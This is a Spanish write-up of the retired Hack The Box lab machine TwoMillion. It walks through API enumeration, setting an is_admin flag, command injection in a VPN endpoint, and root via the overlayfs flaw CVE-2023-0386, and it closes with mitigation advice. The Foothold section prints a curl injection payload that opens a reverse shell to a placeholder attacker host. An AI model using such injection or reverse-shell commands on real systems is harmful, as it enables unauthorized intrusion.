---
machine: TwoMillion
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, api, command-injection, overlayfs, privesc]
---

# TwoMillion — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web reproduce el reto de invitación original de HTB. Se genera un código por la API, se registra una cuenta y se abusa de `/api/v1/admin/settings/update` para activar el rol admin. El endpoint de generación de VPN es inyectable y da shell como `admin`; las credenciales de la base llevan a otro usuario y CVE-2023-0386 (overlayfs) da root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` una copia de la plataforma HTB.
- `ffuf` descubre `2million.htb` y `/invite`.
- `/js/inviteapi.min.js` está ofuscado y contiene la lógica del código.

## Enumeración

- `POST /api/v1/invite/how/to/generate` devuelve instrucciones y un cifrado.
- `POST /api/v1/invite/generate` entrega un código base64.
- `GET /api/v1` lista los endpoints, incluidos los de admin.

## Foothold

Se registra una cuenta y se envía `PUT /api/v1/admin/settings/update` con `is_admin: true`. El endpoint `/api/v1/admin/vpn/generate` pasa el usuario a `system`, así que una inyección da shell como `admin`.

```bash
curl -s -X PUT 'http://2million.htb/api/v1/admin/settings/update' -H "Cookie: PHPSESSID=<SESSION>" -H 'Content-Type: application/json' --data '{"is_admin":true}'
curl -s -X POST 'http://2million.htb/api/v1/admin/vpn/generate' -H "Cookie: PHPSESSID=<SESSION>" --data 'username=admin; bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'
```

## Movimiento lateral

La configuración de la aplicación contiene credenciales de MySQL. Se leen los usuarios y se cambia la contraseña de un usuario con shell para entrar por SSH.

```bash
mysql -u <USER> -p'<PASSWORD>' -e 'select * from users;'
```

## Escalada de privilegios

El kernel es vulnerable a CVE-2023-0386 (overlayfs). Se compila el exploit, se crea un archivo con SUID en la capa superior y se ejecuta una bash como root.

```bash
gcc -o exploit exploit.c
./exploit
```

## Evidencia

- Código de invitación generado por la API.
- `is_admin` activado y shell como `admin`.
- Credenciales de MySQL y SSH.
- CVE-2023-0386 y root.

## Lecciones aprendidas

- Ocultar JavaScript no protege la lógica de una API.
- Un campo `is_admin` aceptado desde el cliente es escalada directa.
- Un kernel sin parchear convierte una shell de usuario en root.

## Mitigación y detección

- Validar roles en servidor y no aceptar campos de privilegio.
- Parametrizar comandos y evitar `system` con entrada del usuario.
- Actualizar el kernel y restringir overlayfs.

## Referencias

- [0xdf — TwoMillion](https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html)
- [IppSec — TwoMillion](https://www.youtube.com/watch?v=Exl4P3fsF7U)
- [Hack The Box — TwoMillion](https://app.hackthebox.com/machines/twomillion)
